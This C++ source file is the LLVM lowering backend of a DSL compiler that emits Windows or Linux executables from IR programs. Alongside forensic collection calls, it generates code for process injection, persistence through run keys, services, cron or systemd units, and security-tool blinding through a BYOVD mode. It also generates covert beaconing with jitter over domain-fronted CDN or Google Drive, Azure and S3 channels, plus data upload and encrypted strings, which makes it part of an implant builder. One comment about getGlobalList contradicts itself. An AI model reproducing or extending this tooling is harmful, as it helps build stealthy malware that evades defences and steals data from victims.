#include "lowering/lowering.h"
#include <llvm/IR/Verifier.h>
#include <llvm/IR/Constants.h>
#include <llvm/IR/DerivedTypes.h>
#include <llvm/Support/TargetSelect.h>
#include <llvm/Support/raw_ostream.h>
#include <llvm/Target/TargetMachine.h>
#include <llvm/MC/TargetRegistry.h>

namespace {

// Canonical opcode name, from the metadata table in ir.cpp.
const char* opcodeName(IROpcode op) {
    for (size_t i = 0; i < OPCODE_TABLE_SIZE; i++) {
        if (OPCODE_TABLE[i].opcode == op) return OPCODE_TABLE[i].name;
    }
    return "unknown";
}

// Collection opcodes map one-to-one onto jrt_collect_* runtime entry points.
bool isCollectOpcode(IROpcode op) {
    return op >= IROpcode::IR_COLLECT_PROC_META &&
           op <= IROpcode::IR_COLLECT_AUTORUNS;
}

// Read an integer named argument (falls back to `def` when absent/mistyped).
int namedInt(const IRInstruction& inst, const std::string& key, int def) {
    for (const auto& [k, v] : inst.named_args) {
        if (k != key) continue;
        if (std::holds_alternative<int>(v)) return std::get<int>(v);
    }
    return def;
}

// Read a string named argument (falls back to `def`).
std::string namedStr(const IRInstruction& inst, const std::string& key,
                     const std::string& def) {
    for (const auto& [k, v] : inst.named_args) {
        if (k != key) continue;
        if (std::holds_alternative<std::string>(v)) return std::get<std::string>(v);
    }
    return def;
}

// Map a symbolic enum value to the integer the runtime expects.
int enumOf(const std::string& key, const std::string& val, int def) {
    // Injection mode
    if (key == "mode") {
        if (val == "SECTION_MAP") return 0;
        if (val == "APC")         return 1;
        if (val == "BYOVD")       return 0;  // blind mode
    }
    // Persistence method
    if (key == "method") {
        if (val == "RUN_KEY") return 0;
        if (val == "SERVICE") return 1;
        if (val == "CRON")    return 2;
        if (val == "UNIT")    return 3;
    }
    // Beacon / transport profile
    if (key == "profile") {
        if (val == "CDN_FRONT")  return 0;
        if (val == "GDRIVE")     return 1;
        if (val == "AZURE_BLOB") return 2;
        if (val == "S3")         return 3;
        if (val == "AUTO")       return 0;
    }
    return def;
}

} // namespace

LLVMLowering::LLVMLowering(PlatformTarget target, const std::string& seed)
    : target_(target), seed_(seed), builder_(ctx_)
{
    // Initialize LLVM targets
    llvm::InitializeAllTargetInfos();
    llvm::InitializeAllTargets();
    llvm::InitializeAllTargetMCs();
    llvm::InitializeAllAsmParsers();
    llvm::InitializeAllAsmPrinters();

    module_ = std::make_unique<llvm::Module>("jockey_module", ctx_);

    // Set target triple
    if (target_ == PlatformTarget::WINDOWS) {
        jockeySetModuleTriple(*module_, llvm::Triple("x86_64-pc-windows-msvc"));
    } else {
        jockeySetModuleTriple(*module_, llvm::Triple("x86_64-unknown-linux-gnu"));
    }
}

void LLVMLowering::declareRuntimeFunctions() {
    // ── Common types ───────────────────────────────────────────────
    auto void_ty  = llvm::Type::getVoidTy(ctx_);
    auto i8_ptr   = llvm::PointerType::get(ctx_, 0);  // opaque pointer
    auto i32_ty   = llvm::Type::getInt32Ty(ctx_);

    // Context struct pointer — passed to all runtime functions
    // struct JrtContext { ... }; — opaque to the compiler
    auto ctx_ty = i8_ptr;

    // ── jrt_init: Initialize the runtime ───────────────────────────
    // JrtContext* jrt_init(void);
    auto init_ty = llvm::FunctionType::get(ctx_ty, {}, false);
    runtime_funcs_["jrt_init"] =
        llvm::Function::Create(init_ty, llvm::Function::ExternalLinkage,
                               "jrt_init", module_.get());

    // ── jrt_cleanup: Destroy runtime, wipe memory ──────────────────
    // void jrt_cleanup(JrtContext* ctx);
    auto cleanup_ty = llvm::FunctionType::get(void_ty, {ctx_ty}, false);
    runtime_funcs_["jrt_cleanup"] =
        llvm::Function::Create(cleanup_ty, llvm::Function::ExternalLinkage,
                               "jrt_cleanup", module_.get());

    // ── Collection functions ───────────────────────────────────────
    // All follow the pattern:
    //   ArtifactResult* jrt_collect_<name>(JrtContext* ctx);
    auto collect_ty = llvm::FunctionType::get(i8_ptr, {ctx_ty}, false);

    const char* collect_funcs[] = {
        "jrt_collect_proc_meta",
        "jrt_collect_service_enum",
        "jrt_collect_network_connections",
        "jrt_collect_scheduled_tasks",
        "jrt_collect_persistence",
        "jrt_collect_mft",
        "jrt_collect_usn",
        "jrt_collect_evtlog",
        "jrt_collect_prefetch",
        "jrt_collect_shimcache_amcache",
        "jrt_collect_registry",
        "jrt_collect_network_capture",
        "jrt_collect_memory",
        "jrt_collect_autoruns",
    };
    for (const char* name : collect_funcs) {
        runtime_funcs_[name] =
            llvm::Function::Create(collect_ty, llvm::Function::ExternalLinkage,
                                   name, module_.get());
    }

    // ── jrt_collect_evtlog with channel argument ───────────────────
    // ArtifactResult* jrt_collect_evtlog_channel(JrtContext* ctx, const char* channel);
    auto evtlog_chan_ty = llvm::FunctionType::get(i8_ptr, {ctx_ty, i8_ptr}, false);
    runtime_funcs_["jrt_collect_evtlog_channel"] =
        llvm::Function::Create(evtlog_chan_ty, llvm::Function::ExternalLinkage,
                               "jrt_collect_evtlog_channel", module_.get());

    // ── Action functions ───────────────────────────────────────────
    // void jrt_inject(JrtContext* ctx, int pid, void* payload, int mode);
    auto inject_ty = llvm::FunctionType::get(void_ty, {ctx_ty, i32_ty, i8_ptr, i32_ty}, false);
    runtime_funcs_["jrt_inject"] =
        llvm::Function::Create(inject_ty, llvm::Function::ExternalLinkage,
                               "jrt_inject", module_.get());

    // void jrt_persist(JrtContext* ctx, int method);
    auto persist_ty = llvm::FunctionType::get(void_ty, {ctx_ty, i32_ty}, false);
    runtime_funcs_["jrt_persist"] =
        llvm::Function::Create(persist_ty, llvm::Function::ExternalLinkage,
                               "jrt_persist", module_.get());

    // void jrt_blind(JrtContext* ctx, int mode, int profile);
    auto blind_ty = llvm::FunctionType::get(void_ty, {ctx_ty, i32_ty, i32_ty}, false);
    runtime_funcs_["jrt_blind"] =
        llvm::Function::Create(blind_ty, llvm::Function::ExternalLinkage,
                               "jrt_blind", module_.get());

    // void jrt_beacon(JrtContext* ctx, int profile, double jitter);
    auto dbl_ty = llvm::Type::getDoubleTy(ctx_);
    auto beacon_ty = llvm::FunctionType::get(void_ty, {ctx_ty, i32_ty, dbl_ty}, false);
    runtime_funcs_["jrt_beacon"] =
        llvm::Function::Create(beacon_ty, llvm::Function::ExternalLinkage,
                               "jrt_beacon", module_.get());

    // void jrt_exec_trusted(JrtContext* ctx, const char* bin, const char* args);
    auto exec_ty = llvm::FunctionType::get(void_ty, {ctx_ty, i8_ptr, i8_ptr}, false);
    runtime_funcs_["jrt_exec_trusted"] =
        llvm::Function::Create(exec_ty, llvm::Function::ExternalLinkage,
                               "jrt_exec_trusted", module_.get());

    // ── Transform functions (pipeline stages) ──────────────────────
    // ArtifactResult* jrt_filter(JrtContext* ctx, ArtifactResult* input,
    //                            const char* field, int op, const char* value);
    auto filter_ty = llvm::FunctionType::get(i8_ptr,
        {ctx_ty, i8_ptr, i8_ptr, i32_ty, i8_ptr}, false);
    runtime_funcs_["jrt_filter"] =
        llvm::Function::Create(filter_ty, llvm::Function::ExternalLinkage,
                               "jrt_filter", module_.get());

    // ArtifactResult* jrt_timeline(JrtContext* ctx, ArtifactResult* input);
    auto timeline_ty = llvm::FunctionType::get(i8_ptr, {ctx_ty, i8_ptr}, false);
    runtime_funcs_["jrt_timeline"] =
        llvm::Function::Create(timeline_ty, llvm::Function::ExternalLinkage,
                               "jrt_timeline", module_.get());

    // void jrt_upload(JrtContext* ctx, ArtifactResult* data);
    auto upload_ty = llvm::FunctionType::get(void_ty, {ctx_ty, i8_ptr}, false);
    runtime_funcs_["jrt_upload"] =
        llvm::Function::Create(upload_ty, llvm::Function::ExternalLinkage,
                               "jrt_upload", module_.get());

    // ArtifactResult* jrt_hash_all(JrtContext* ctx, ArtifactResult* input);
    runtime_funcs_["jrt_hash_all"] =
        llvm::Function::Create(timeline_ty, llvm::Function::ExternalLinkage,
                               "jrt_hash_all", module_.get());

    // ArtifactResult* jrt_alert(JrtContext* ctx, ArtifactResult* input);
    runtime_funcs_["jrt_alert"] =
        llvm::Function::Create(timeline_ty, llvm::Function::ExternalLinkage,
                               "jrt_alert", module_.get());

    // ArtifactResult* jrt_ioc_check(JrtContext* ctx, ArtifactResult* input);
    runtime_funcs_["jrt_ioc_check"] =
        llvm::Function::Create(timeline_ty, llvm::Function::ExternalLinkage,
                               "jrt_ioc_check", module_.get());

    // ArtifactResult* jrt_rootkit_detect(JrtContext* ctx);
    runtime_funcs_["jrt_rootkit_detect"] =
        llvm::Function::Create(collect_ty, llvm::Function::ExternalLinkage,
                               "jrt_rootkit_detect", module_.get());

    // ── String decryption (runtime counterpart of Phase 3 pass) ────
    // const char* jrt_decrypt_string(const void* encrypted_blob);
    auto decrypt_ty = llvm::FunctionType::get(i8_ptr, {i8_ptr}, false);
    runtime_funcs_["jrt_decrypt_string"] =
        llvm::Function::Create(decrypt_ty, llvm::Function::ExternalLinkage,
                               "jrt_decrypt_string", module_.get());
}

std::unique_ptr<llvm::Module> LLVMLowering::lower(const IRProgram& program) {
    declareRuntimeFunctions();
    generateEntryPoint(program);

    // Verify the module
    std::string err;
    llvm::raw_string_ostream err_stream(err);
    if (llvm::verifyModule(*module_, &err_stream)) {
        llvm::errs() << "LLVM IR verification failed:\n" << err << "\n";
        return nullptr;
    }

    return std::move(module_);
}

void LLVMLowering::generateEntryPoint(const IRProgram& program) {
    auto i32_ty = llvm::Type::getInt32Ty(ctx_);
    auto i8_ptr = llvm::PointerType::get(ctx_, 0);

    // ── Create main / WinMain ──────────────────────────────────────
    llvm::FunctionType* entry_ty;
    const char* entry_name;

    if (target_ == PlatformTarget::WINDOWS) {
        // int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
        //             LPSTR lpCmdLine, int nCmdShow);
        entry_ty = llvm::FunctionType::get(i32_ty,
            {i8_ptr, i8_ptr, i8_ptr, i32_ty}, false);
        entry_name = "WinMain";
    } else {
        // int main(int argc, char** argv);
        auto argv_ty = llvm::PointerType::get(ctx_, 0);  // char**
        entry_ty = llvm::FunctionType::get(i32_ty, {i32_ty, argv_ty}, false);
        entry_name = "main";
    }

    current_fn_ = llvm::Function::Create(entry_ty,
        llvm::Function::ExternalLinkage, entry_name, module_.get());

    auto entry_bb = llvm::BasicBlock::Create(ctx_, "entry", current_fn_);
    builder_.SetInsertPoint(entry_bb);

    // ── Initialize runtime ─────────────────────────────────────────
    ctx_val_ = builder_.CreateCall(runtime_funcs_["jrt_init"], {}, "jrt_ctx");

    // ── Lower each instruction in the program body ─────────────────
    for (const auto& item : program.body) {
        if (std::holds_alternative<IRInstruction>(item)) {
            pipeline_ctx_ = nullptr;  // standalone instruction
            lowerInstruction(std::get<IRInstruction>(item));
        } else {
            lowerPipeline(std::get<IRPipeline>(item));
        }
    }

    // ── Cleanup and return ─────────────────────────────────────────
    builder_.CreateCall(runtime_funcs_["jrt_cleanup"], {ctx_val_});
    builder_.CreateRet(llvm::ConstantInt::get(i32_ty, 0));
}

void LLVMLowering::lowerInstruction(const IRInstruction& inst) {
    // The runtime context handle returned by jrt_init, stored in
    // generateEntryPoint(), is the first argument of every runtime call.
    llvm::Value* ctx = ctx_val_;

    auto i32_ty = llvm::Type::getInt32Ty(ctx_);
    auto dbl_ty = llvm::Type::getDoubleTy(ctx_);
    auto null_ptr = llvm::ConstantPointerNull::get(
        llvm::PointerType::get(ctx_, 0));

    auto constInt = [&](int v) {
        return llvm::ConstantInt::get(i32_ty, v);
    };

    switch (inst.opcode) {
        // ── Collection ─────────────────────────────────────────────
        case IROpcode::IR_COLLECT_EVTLOG: {
            if (!inst.target.empty()) {
                // Specific channel: collect evtlog("Security")
                auto channel = emitStringLiteral(inst.target, -1);
                auto result = builder_.CreateCall(
                    runtime_funcs_["jrt_collect_evtlog_channel"],
                    {ctx, channel}, "evtlog_data");
                pipeline_ctx_ = result;
            } else {
                auto result = builder_.CreateCall(
                    runtime_funcs_["jrt_collect_evtlog"], {ctx}, "evtlog_data");
                pipeline_ctx_ = result;
            }
            break;
        }

        // ── Actions ────────────────────────────────────────────────
        case IROpcode::IR_INJECT: {
            int pid = 0;
            if (!inst.pos_args.empty()) {
                try { pid = std::stoi(inst.pos_args[0]); } catch (...) { pid = 0; }
            }
            int mode = enumOf("mode", namedStr(inst, "mode", "SECTION_MAP"), 0);
            builder_.CreateCall(runtime_funcs_["jrt_inject"],
                {ctx, constInt(pid), null_ptr, constInt(mode)});
            break;
        }

        case IROpcode::IR_PERSIST: {
            int method = enumOf("method", namedStr(inst, "method", "RUN_KEY"), 0);
            builder_.CreateCall(runtime_funcs_["jrt_persist"],
                {ctx, constInt(method)});
            break;
        }

        case IROpcode::IR_BLIND: {
            int mode = enumOf("mode", namedStr(inst, "mode", "BYOVD"), 0);
            int profile = enumOf("profile", namedStr(inst, "profile", "AUTO"), 0);
            builder_.CreateCall(runtime_funcs_["jrt_blind"],
                {ctx, constInt(mode), constInt(profile)});
            break;
        }

        case IROpcode::IR_EXEC_TRUSTED: {
            std::string bin = inst.target;
            std::string args = inst.pos_args.empty() ? "" : inst.pos_args.back();
            auto bin_c = emitStringLiteral(bin, -1);
            auto args_c = emitStringLiteral(args, -1);
            builder_.CreateCall(runtime_funcs_["jrt_exec_trusted"],
                {ctx, bin_c, args_c});
            break;
        }

        // ── Communication ──────────────────────────────────────────
        case IROpcode::IR_BEACON: {
            // Extract profile and jitter from named args
            int profile = enumOf("profile", namedStr(inst, "profile", "CDN_FRONT"), 0);
            double jitter = 0.3;  // default
            for (const auto& [key, val] : inst.named_args) {
                if (key == "jitter" && std::holds_alternative<double>(val)) {
                    jitter = std::get<double>(val);
                }
            }
            auto jitter_val = llvm::ConstantFP::get(dbl_ty, jitter);
            builder_.CreateCall(runtime_funcs_["jrt_beacon"],
                {ctx, constInt(profile), jitter_val});
            break;
        }

        case IROpcode::IR_UPLOAD: {
            builder_.CreateCall(runtime_funcs_["jrt_upload"],
                {ctx, pipeline_ctx_ ? pipeline_ctx_ : null_ptr});
            break;
        }

        // ── Transforms ─────────────────────────────────────────────
        case IROpcode::IR_FILTER: {
            std::string field = inst.target;
            std::string value = inst.pos_args.empty() ? "" : inst.pos_args[0];
            std::string op_s = namedStr(inst, "op", "==");
            int op = (op_s == "!=") ? 1 : 0;
            auto field_c = emitStringLiteral(field, -1);
            auto value_c = emitStringLiteral(value, -1);
            auto result = builder_.CreateCall(runtime_funcs_["jrt_filter"],
                {ctx, pipeline_ctx_ ? pipeline_ctx_ : null_ptr,
                 field_c, constInt(op), value_c}, "filtered_data");
            pipeline_ctx_ = result;
            break;
        }

        case IROpcode::IR_TIMELINE: {
            auto result = builder_.CreateCall(runtime_funcs_["jrt_timeline"],
                {ctx, pipeline_ctx_ ? pipeline_ctx_ : null_ptr}, "timeline_data");
            pipeline_ctx_ = result;
            break;
        }

        case IROpcode::IR_HASH_ALL: {
            auto result = builder_.CreateCall(runtime_funcs_["jrt_hash_all"],
                {ctx, pipeline_ctx_ ? pipeline_ctx_ : null_ptr}, "hashed_data");
            pipeline_ctx_ = result;
            break;
        }

        case IROpcode::IR_ALERT: {
            auto result = builder_.CreateCall(runtime_funcs_["jrt_alert"],
                {ctx, pipeline_ctx_ ? pipeline_ctx_ : null_ptr}, "alerted_data");
            pipeline_ctx_ = result;
            break;
        }

        case IROpcode::IR_IOC_CHECK: {
            auto result = builder_.CreateCall(runtime_funcs_["jrt_ioc_check"],
                {ctx, pipeline_ctx_ ? pipeline_ctx_ : null_ptr}, "ioc_data");
            pipeline_ctx_ = result;
            break;
        }

        // ── Meta ───────────────────────────────────────────────────
        case IROpcode::IR_ROOTKIT_DETECT: {
            auto result = builder_.CreateCall(
                runtime_funcs_["jrt_rootkit_detect"], {ctx}, "rootkit_data");
            pipeline_ctx_ = result;
            break;
        }

        default: {
            // Remaining opcodes are all collection entry points named
            // jrt_collect_<opcode-name> taking only the runtime context.
            if (isCollectOpcode(inst.opcode)) {
                std::string fn = std::string("jrt_") + opcodeName(inst.opcode);
                auto result = builder_.CreateCall(
                    runtime_funcs_[fn], {ctx}, fn.c_str());
                pipeline_ctx_ = result;
            }
            break;
        }
    }
}

void LLVMLowering::lowerPipeline(const IRPipeline& pipeline) {
    pipeline_ctx_ = nullptr;
    for (const auto& stage : pipeline.stages) {
        lowerInstruction(stage);
        // pipeline_ctx_ is updated by each lowerInstruction call,
        // so the next stage sees the previous stage's output.
    }
}

llvm::GlobalVariable* LLVMLowering::emitStringLiteral(
    const std::string& str, int index) {
    auto constant = llvm::ConstantDataArray::getString(ctx_, str, true);
    // Module::getGlobalList() is private since LLVM 21; use getGlobalList()
    // via the public alias when available, else index by a running counter.
#if LLVM_VERSION_MAJOR >= 21
    size_t next_idx = module_->global_size();
#else
    size_t next_idx = module_->getGlobalList().size();
#endif
    auto global = new llvm::GlobalVariable(
        *module_, constant->getType(), true,
        llvm::GlobalValue::PrivateLinkage, constant,
        ".str." + std::to_string(index >= 0 ? index : next_idx));
    global->setUnnamedAddr(llvm::GlobalValue::UnnamedAddr::Global);
    return global;
}
